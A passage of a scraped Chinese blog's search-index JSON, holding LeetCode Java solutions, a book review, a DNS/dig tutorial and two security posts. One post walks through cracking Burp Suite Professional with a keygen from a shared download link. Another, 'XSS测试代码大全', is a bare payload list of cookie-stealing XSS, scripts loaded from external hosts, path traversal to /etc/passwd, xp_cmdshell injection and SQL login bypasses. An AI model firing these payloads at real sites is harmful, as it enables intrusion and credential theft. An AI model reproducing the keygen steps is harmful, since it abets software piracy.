&#125; // find the index of first non-zero digit int idx = 0; while (idx &lt; digits &amp;&amp; stk[idx] == '0') &#123; idx++; &#125; return idx == digits ? \"0\" : new String(stk, idx, digits - idx); &#125; 参考 remove-k-digits","updated":"2020-07-19T00:23:28.036Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"greedy","slug":"greedy","permalink":"http://xwolf191.github.io/tags/greedy/"}]},{"title":"43. Multiply Strings","date":"2019-06-11T10:40:00.000Z","path":"2019/06/11/数据结构和算法/leetcode/Multiply Strings/","text":"Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string. Example 1: 12Input: num1 = &quot;2&quot;, num2 = &quot;3&quot;Output: &quot;6&quot; Example 2: 12Input: num1 = &quot;123&quot;, num2 = &quot;456&quot;Output: &quot;56088&quot; Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contain only digits 0-9. Both num1 and num2 do not contain any leading zero, except the number 0 itself. You must not use any built-in BigInteger library or convert the inputs to integer directly. 题意字符串相乘 实现 java 1234567891011121314151617181920public static String multiply(String num1, String num2) &#123; int m = num1.length(), n = num2.length(); int[] pos = new int[m + n]; for(int i = m - 1; i &gt;= 0; i--) &#123; for(int j = n - 1; j &gt;= 0; j--) &#123; int mul = ( num1.charAt(i) - '0' ) * ( num2.charAt(j) - '0' ); int p1 = i + j, p2 = i + j + 1; int sum = mul + pos[p2]; pos[p1] += sum / 10; pos[p2] = sum % 10; &#125; &#125; StringBuilder sb = new StringBuilder(); for(int p: pos) &#123; if(!( sb.length() == 0 &amp;&amp; p == 0 )) &#123; sb.append(p); &#125; &#125; return sb.length() == 0 ? \"0\" : sb.toString(); &#125; 参考 multiply-strings","updated":"2020-07-19T00:23:28.033Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"math","slug":"math","permalink":"http://xwolf191.github.io/tags/math/"}]},{"title":"263. Ugly Number","date":"2019-06-04T10:00:00.000Z","path":"2019/06/04/数据结构和算法/leetcode/Ugly Number/","text":"Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. Example 1: 123Input: 6Output: trueExplanation: 6 = 2 × 3 -Example 2: 123Input: 8Output: trueExplanation: 8 = 2 × 2 × 2 Example 3: 123Input: 14Output: falseExplanation: 14 is not ugly since it includes another prime factor 7. Note: 121 is typically treated as an ugly number.Input is within the 32-bit signed integer range: [−231, 231 − 1]. 题意判断一个数字是否为“丑数”,“丑数”是因子仅由 2,3,5 组成的数字. 实现 java 123456789101112131415161718public boolean isUgly(int num) &#123; if(num == 1) &#123; return true; &#125; if(num == 0) &#123; return false; &#125; while (num % 2 == 0) &#123; num = num &gt;&gt; 1; &#125; while (num % 3 == 0) &#123; num = num / 3; &#125; while (num % 5 == 0) &#123; num = num / 5; &#125; return num == 1; &#125; 参考 ugly-number","updated":"2020-07-19T00:23:28.042Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"math","slug":"math","permalink":"http://xwolf191.github.io/tags/math/"}]},{"title":"1073. Adding Two Negabinary Numbers","date":"2019-06-04T06:15:00.000Z","path":"2019/06/04/数据结构和算法/leetcode/Adding Two Negabinary Numbers/","text":"Given two numbers arr1 and arr2 in base -2, return the result of adding them together. Each number is given in array format: as an array of 0s and 1s, from most significant bit to least significant bit. For example, arr = [1,1,0,1] represents the number (-2)^3 + (-2)^2 + (-2)^0 = -3. A number arr in array format is also guaranteed to have no leading zeros: either arr == [0] or arr[0] == 1. Return the result of adding arr1 and arr2 in the same format: as an array of 0s and 1s with no leading zeros. Example 1: 123Input: arr1 = [1,1,1,1,1], arr2 = [1,0,1]Output: [1,0,0,0,0]Explanation: arr1 represents 11, arr2 represents 5, the output represents 16. Note: 1 &lt;= arr1.length &lt;= 1000 1 &lt;= arr2.length &lt;= 1000 arr1 and arr2 have no leading zeros arr1[i] is 0 or 1 arr2[i] is 0 or 1 题意将两个数组,转化为-2 进制数后求和。将和也对应转化为-2 进制返回. 实现 java 1234567891011121314151617181920public int[] addNegabinary(int[] arr1, int[] arr2) &#123; int i = arr1.length - 1, j = arr2.length - 1, carry = 0; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (i &gt;= 0 || j &gt;= 0 || carry != 0) &#123; int v1 = i &gt;= 0 ? arr1[i--] : 0; int v2 = j &gt;= 0 ? arr2[j--] : 0; carry = v1 + v2 + carry; stack.push(carry &amp; 1); carry = -(carry &gt;&gt; 1); &#125; while (!stack.isEmpty() &amp;&amp; stack.peek() == 0) &#123; stack.pop(); &#125; int[] res = new int[stack.size()]; int index = 0; while (!stack.isEmpty()) &#123; res[index++] = stack.pop(); &#125; return res.length == 0 ? new int[1] : res; &#125; 参考资料 Negative_base adding-two-negabinary-numbers","updated":"2020-07-19T00:23:28.022Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"math","slug":"math","permalink":"http://xwolf191.github.io/tags/math/"}]},{"title":"我曾走在崩溃的边缘","date":"2019-06-04T02:00:00.000Z","path":"2019/06/04/读书笔记/我曾走在崩溃的边缘/","text":"内容简介【编辑推荐】 著作首次由俞敏洪亲自完整地讲述创业发展历程，以及其中遇到的诸多团队、管理、与竞争者甚至社会各界的关系等问题，同时进行了自我深度剖析，从信息有效性、逻辑完整性、层次多样性来说，都是一部优秀的作品。 著作以“创业维艰”为视角，初次曝光诸多情景与细节，并揭开被事业成功掩盖的那些困难与困惑，完整度和深度前所未有。 “这里没有高深的理论知识，只有场景和故事。通过场景还原，总结我的经验教训，把故事掰开了、揉碎了、坦诚地与大家讲述我曾遇到的问题，让跟当初的我一样的创业者、年轻朋友，回避掉一些坑，尽可能地获得一些参考，哪怕一点点”，这是俞敏洪的坦诚之言，也是这本书的一个基调，处在各个状态的创业者、需要破局跃迁的管理者、有想法又追求的年轻人、学生群体及家长等，都能从中受益。 【内容介绍】这本书是作者俞敏洪第一次完整、深度地讲述新东方从 0 到 1、从 1 到 N 的创业历程，披露了诸多不为人知的细节，让人看到带领着新东方从一个培训班发展成为上市集团的创业者，以及他的团队曾经经过的至暗时刻，甚至曾走到崩溃的边缘。创业维艰，1/4 个世纪的风雨征程，完整地被记录，激荡地再现了新东方创始团队及新东方人，在时代的光辉中砥砺前行的身影。 延着内容主线，“三驾马车”的光阴故事已经留存，新生代的管理团队已在快速发展的互联网时代中开拓进取，搏出广阔天地，而今，人工智能浪潮下，新东方又将向何处进发，仍是新东方故事的待续篇章。 相信这本书，定能让读者在作者个人一贯的幽默叙事方式中，在个人发展、组织建设、企业管理等多个方面受到启发和激励。 作者简介俞敏洪1962 年生，江苏江阴人，毕业于北京大学西语系毕业。1985 年至 1991 年任北京大学外语系教师，1993 年创办北京新东方学校，2003 年成立新东方教育科技集团。2006 年 9 月 7 日，带领新东方在美国纽约证券交易所成功上市。现任新东方教育科技集团董事长、北京大学企业家俱乐部理事长、洪泰基金创始合伙人。第十一届、第十二届、第十三届全国政协委员，民盟中央委员，民盟中央教育委员会副主任。 读后感这本书真的不错,不仅有励志有公司发展历程中的各种问题的暴露,对有创业打算的人来说有很好的参考价值.公司成长过程中暴露的各种问题,虽然短期内很挣钱但是与公司的经营理念背道而驰,如何决策可能直接影响公司以后的发展。俞敏洪从重视人文，到与科技的结合,业务的扩张也很迅速.从各自为政到集团化统一管理一步步变革很不容易。","updated":"2020-07-19T00:23:28.449Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"Burp Suite专业版安装","date":"2019-06-03T03:00:00.000Z","path":"2019/06/03/security/burp suite安装/","text":"准备工作 JDK 1.8 安装 Burp Suite Professional 下载(1.7.37) 简介概述Burp Suite 是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报。 工具箱Proxy——是一个拦截 HTTP/S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现 web 应用程序的安全漏洞。Intruder——是一个定制的高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。Repeater——是一个靠手动操作来补发单独的 HTTP 请求，并分析应用程序响应的工具。Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 安装安装到官网下载 burp suite 专业版,当前版本为 1.7.37. 破解下载 jar百度网盘下载（H 大会一直更新）：链接: https://pan.baidu.com/s/1brjPKM7 密码: 9v4r 破解点击 burp-loader-keygen.jar 启动激活程序,如果无法启动则可以在命令行执行 1java -jar burp-loader-keygen.jar 进入如下界面.修改 License Text,License 也随着改变.复制 License，点击 Run 启动 Burp 主界面. 然后点击 next 进入下一步,进入下面的界面 点击 Manual activation 按钮进入下一步按照下图方式激活,先将图示 1 复制到 2 中,将生成的 activation response 复制到右图 4 位置，然后点击完成. 可以看到激活成功,显示 2029 年过期. 至此破解完成,可以探索安全的神秘世界了.","updated":"2020-07-19T00:23:27.902Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"144. Binary Tree Preorder Traversal","date":"2019-05-30T07:30:00.000Z","path":"2019/05/30/数据结构和算法/leetcode/Binary Tree Preorder Traversal/","text":"Given a binary tree, return the preorder traversal of its nodes’ values. Example: 123456Input: [1,null,2,3] 1 \\ 2 / 3 Output: [1,2,3] Follow up: Recursive solution is trivial, could you do it iteratively? 题意二叉树的前序遍历 实现 java 递归解决 12345678910public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; pre = new LinkedList&lt;&gt;(); if(root==null) &#123; return pre; &#125; pre.add(root.val); pre.addAll(preorderTraversal(root.left)); pre.addAll(preorderTraversal(root.right)); return pre; &#125; java 迭代 123456789101112131415public List&lt;Integer&gt; preorderTraversal(TreeNode node) &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); Stack&lt;TreeNode&gt; rights = new Stack&lt;&gt;(); while(node != null) &#123; list.add(node.val); if (node.right != null) &#123; rights.push(node.right); &#125; node = node.left; if (node == null &amp;&amp; !rights.isEmpty()) &#123; node = rights.pop(); &#125; &#125; return list; &#125; 参考 binary-tree-preorder-traversal","updated":"2020-07-19T00:23:28.024Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"binary tree","slug":"binary-tree","permalink":"http://xwolf191.github.io/tags/binary-tree/"}]},{"title":"1029. Two City Scheduling","date":"2019-05-29T08:25:00.000Z","path":"2019/05/29/数据结构和算法/leetcode/Two City Scheduling/","text":"There are 2N people a company is planning to interview. The cost of flying the i-th person to city A is costs[i][0], and the cost of flying the i-th person to city B is costs[i][1]. Return the minimum cost to fly every person to a city such that exactly N people arrive in each city. Example 1: 123456789Input: [[10,20],[30,200],[400,50],[30,20]]Output: 110Explanation:The first person goes to city A for a cost of 10.The second person goes to city A for a cost of 30.The third person goes to city B for a cost of 50.The fourth person goes to city B for a cost of 20.The total minimum cost is 10 + 30 + 50 + 20 = 110 to have half the people interviewing in each city. Note: 1 &lt;= costs.length &lt;= 100 It is guaranteed that costs.length is even. 1 &lt;= costs[i][0], costs[i][1] &lt;= 1000 题意公司计划采访的人数为 2N。 将第 i 个人飞往城市 A 的费用是[i][0]，将第 i 个人飞到城市 B 的费用是费用[i][1]。 求将每个人带到一个城市的最低费用并且每个城市就有 N 个人到达。 实现 java DP 12345678910111213141516public int twoCitySchedCost(int[][] costs) &#123; int N = costs.length / 2; int[][] dp = new int[N + 1][N + 1]; for (int i = 1; i &lt;= N; i++) &#123; dp[i][0] = dp[i - 1][0] + costs[i - 1][0]; &#125; for (int j = 1; j &lt;= N; j++) &#123; dp[0][j] = dp[0][j - 1] + costs[j - 1][1]; &#125; for (int i = 1; i &lt;= N; i++) &#123; for (int j = 1; j &lt;= N; j++) &#123; dp[i][j] = Math.min(dp[i - 1][j] + costs[i + j - 1][0], dp[i][j - 1] + costs[i + j - 1][1]); &#125; &#125; return dp[N][N]; &#125; 参考资料 two-city-scheduling","updated":"2020-07-19T00:23:28.040Z","tags":[{"name":"DP","slug":"DP","permalink":"http://xwolf191.github.io/tags/DP/"},{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"},{"name":"greedy","slug":"greedy","permalink":"http://xwolf191.github.io/tags/greedy/"}]},{"title":"XSS测试代码大全","date":"2019-05-27T10:20:00.000Z","path":"2019/05/27/security/XSS测试代码大全/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;alert(vulnerable)&lt;/script&gt;%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;%0a%0a&lt;script&gt;alert(\\&quot;Vulnerable\\&quot;)&lt;/script&gt;.jsp%22%3cscript%3ealert(%22xss%22)%3c/script%3e%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html%3f.jsp%3f.jsp&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;?sql_debug=1a%5c.aspxa.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;a/a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\\inetpub\\wwwroot\\?.txt&apos;--&amp;&amp;%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;&quot;&lt;IMG src=java\\0script:alert(\\&quot;XSS\\&quot;)&gt;&quot;;&apos; &gt; out&lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;IMG src=&quot;mocha:[code]&quot;&gt;&lt;IMG src=&quot;livescript:[code]&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;&lt;STYLE&gt;@im\\port&apos;\\ja\\vasc\\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;&lt;IMG STYLE=&apos;xss:expre\\ssion(alert(&quot;XSS&quot;))&apos;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;&lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);&lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;admin&apos;--&apos; or 0=0 --&quot; or 0=0 --or 0=0 --&apos; or 0=0 #&quot; or 0=0 #or 0=0 #&apos; or &apos;x&apos;=&apos;x&quot; or &quot;x&quot;=&quot;x&apos;) or (&apos;x&apos;=&apos;x&apos; or 1=1--&quot; or 1=1--or 1=1--&apos; or a=a--&quot; or &quot;a&quot;=&quot;a&apos;) or (&apos;a&apos;=&apos;a&quot;) or (&quot;a&quot;=&quot;ahi&quot; or &quot;a&quot;=&quot;ahi&quot; or 1=1 --hi&apos; or 1=1 --hi&apos; or &apos;a&apos;=&apos;ahi&apos;) or (&apos;a&apos;=&apos;ahi&quot;) or (&quot;a&quot;=&quot;a[/code]","updated":"2020-07-19T00:23:27.902Z","tags":[{"name":"security","slug":"security","permalink":"http://xwolf191.github.io/tags/security/"}]},{"title":"dig使用","date":"2019-05-27T03:30:00.000Z","path":"2019/05/27/linux/dig使用/","text":"DNS 是指：域名系统（Domain Name System）。在 Internet 上域名与 IP 地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识 IP 地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析系统来完成，DNS 就是进行域名解析的系统。 DNS 协议运行在 UDP 协议之上，使用端口号 53。在传输层 TCP 提供端到端可靠的服务,在 UDP 端提供尽力交付的服务。其控制端口作用于 UDP 端口 53。 DNS 解析DNS 记录Domain Name System 域名管理系统 域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的 IP 地址，这一命名的方法或这样管理域名的系统叫做域名管理系统。DNS：Domain Name Server 域名服务器 域名虽然便于人们记忆，但网络中的计算机之间只能互相认识 IP 地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，DNS 就是进行域名解析的服务器。DNS 记录的类型有: A 记录、NS 记录、MX 记录、CNAME 记录、TXT 记录、TTL 值、PTR 值。 A 记录 A（Address）记录是用来指定主机名（或域名）对应的 IP 地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。同时也可以设置域名的子域名。通俗来说 A 记录就是服务器的 IP,域名绑定 A 记录就是告诉 DNS,当你输入域名的时候给你引导向设置在 DNS 的 A 记录所对应的服务器。 简单的说，A 记录是指定域名对应的 IP 地址。 NS 记录 NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个 DNS 服务器来进行解析。 注册域名时，总有默认的 DNS 服务器，每个注册的域名都是由一个 DNS 域名服务器来进行解析的，DNS 服务器 NS 记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com 等。 简单的说，NS 记录是指定由哪个 DNS 服务器解析你的域名。 MX 记录 MX（Mail Exchanger）记录是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。例如，当 Internet 上的某用户要发一封信给 user@mydomain.com 时，该用户的邮件系统通过 DNS 查找 mydomain.com 这个域名的 MX 记录，如果 MX 记录存在， 用户计算机就将邮件发送到 MX 记录所指定的邮件服务器上。 CNAME 记录 CNAME（Canonical Name ）别名记录，允许将多个名字映射到同一台计算机。通常用于同时提供 WWW 和 MAIL 服务的计算机。例如，有一台计算机名为 “host.mydomain.com”（A 记录），它同时提供 WWW 和 MAIL 服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW 和 MAIL， 这两个别名的全称就“www.mydomain.com”和“mail.mydomain.com”，实际上他们都指向 “host.mydomain.com”。 TXT 记录 一般指某个主机名或域名的说明，如：admin IN TXT “管理员, 电话：XXXXXXXXXXX”，mail IN TXT “邮件主机，存放在 xxx , 管理人：AAA”，Jim IN TXT “contact: abc@mailserver.com”，也就是您可以设置 TXT 内容以便使别人联系到您。 TXT 的应用之一，SPF（Sender Policy Framework）反垃圾邮件。SPF 是跟 DNS 相关的一项技术，它的内容写在 DNS 的 TXT 类型的记录里面。MX 记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF 的作用跟 MX 相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。SPF 的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。例如：当邮件服务器收到自称发件人是 spam@gmail.com 的邮件，那么到底它是不是真的 gmail.com 的邮件服务器发过来的呢，我们可以查询 gmail.com 的 SPF 记录，以此防止别人伪造你来发邮件。 TTL 值 TTL（Time-To-Live）原理：TTL 是 IP 协议包中的一个值，它告诉网络路由器包在网络中的时间是否太长而应被丢弃。有很多原因使包在一定时间内不能被传递到目的地。例如，不正确的路由表可能导致包的无限循环。一个解决方法就是在一段时间后丢弃这个包，然后给发送者一个报文，由发送者决定是否要重发。TTL 的初值通常是系统缺省值，是包头中的 8 位的域。TTL 的最初设想是确定一个时间范围，超过此时间就把包丢弃。由于每个路由器都至少要把 TTL 域减一，TTL 通常表示包在被丢弃前最多能经过的路由器个数。当记数到 0 时，路由器决定丢弃该包，并发送一个 ICMP 报文给最初的发送者。 简单的说，TTL 就是一条域名解析记录在 DNS 服务器中的存留时间。当各地的 DNS 服务器接受到解析请求时，就会向域名指定的 NS 服务器发出解析请求从而获得解析记录；在获得这个记录之后，记录会在 DNS 服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS 服务器将不再向 NS 服务器发出请求，而是直接返回刚才获得的记录，而这个记录在 DNS 服务器上保留的时间，就是 TTL 值。 TTL 值设置的应用：一是增大 TTL 值，以节约域名解析时间，给网站访问加速。 一般情况下，域名的各种记录是极少更改的，很可能几个月、几年内都不会有什么变化。我们完全可以增大域名记录的 TTL 值让记录在各地 DNS 服务器中缓存的时间加长，这样在更长的一段时间内，我们访问这个网站时，本地 ISP 的 DNS 服务器就不需要向域名的 NS 服务器发出解析请求，而直接从缓存中返回域名解析记录。 二是减小 TTL 值，减少更换空间时的不可访问时间。 更换空间 99.9%会有 DNS 记录更改的问题，因为缓存的问题，新的域名记录在有的地方可能生效了，但在有的地方可能等上一两天甚至更久才生效。结果就是有的人可能访问到了新服务器，有的人访问到了旧服务器。仅仅是访问的话，这也不是什么大问题，但如果涉及到了邮件发送，这个就有点麻烦了，说不定哪封重要信件就被发送到了那已经停掉的旧服务器上。 为了尽可能的减小这个各地的解析时间差，合理的做法是： 第一步，先查看域名当前的 TTL 值，我们假定是 1 天。 第二步，修改 TTL 值为可设定的最小值，可能的话，建议为 1 分钟，就是 60。 第三步，等待一天，保证各地的 DNS 服务器缓存都过期并更新了记录。 第四步，设置修改新记录，这个时候各地的 DNS 就能以最快的速度更新到新的记录。 第五步，确认各地的 DNS 已经更新完成后，把 TTL 值设置成您想要的值。 一般操作系统的默认 TTL 值如下： TTL=32 Windows 9x/Me ，TTL=64 LINUX ，TTL=128 Windows 200x/XP， TTL=255 Unix PTR 值 PTR 是 pointer 的简写，用于将一个 IP 地址映射到对应的域名，也可以看成是 A 记录的反向，IP 地址的反向解析。 PTR 主要用于邮件服务器，比如邮箱 AAA@XXX.com 给邮箱 BBB@yahoo.com 发了一封邮件，yahoo 邮件服务器接到邮件时会查看这封邮件的头文件，并分析是由哪个 IP 地址发出来的，然后根据这个 IP 地址进行反向解析，如果解析结果对应 XXX.com 的 IP 地址就接受这封邮件，反之则拒绝接收这封邮件。泛域名与泛解析：泛域名是指在一个域名根下，以 XXX.Domain.com 的形式表示这个域名根所有未建立的子域名。 泛解析是把*.Domain.com 的 A 记录解析到某个 IP 地址上，通过访问任意的前缀.domain.com 都能访问到你解析的站点上。 域名绑定 域名绑定是指将域名指向服务器 IP 的操作。 域名转向 域名转向又称为域名指向或域名转发，当用户地址栏中输入您的域名时，将会自动跳转到所指定的另一个域名。一般是使用短的好记的域名转向复杂难记的域名。 记录的用法主机记录就是域名前缀，常见用法有： www 解析后的域名为 www.87677677.com @ 直接解析主域名 87677677.com **泛解析，匹配其他所有域名 .87677677.com Linux DNS 解析(dig)安装centos 安装 1yum install bind-utils 基本命令1234567891011121314151617181920212223242526272829303132[root@docker ~]# dig; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt;;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9725;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;. IN NS;; ANSWER SECTION:. 5747 IN NS d.root-servers.net.. 5747 IN NS c.root-servers.net.. 5747 IN NS b.root-servers.net.. 5747 IN NS a.root-servers.net.. 5747 IN NS m.root-servers.net.. 5747 IN NS k.root-servers.net.. 5747 IN NS 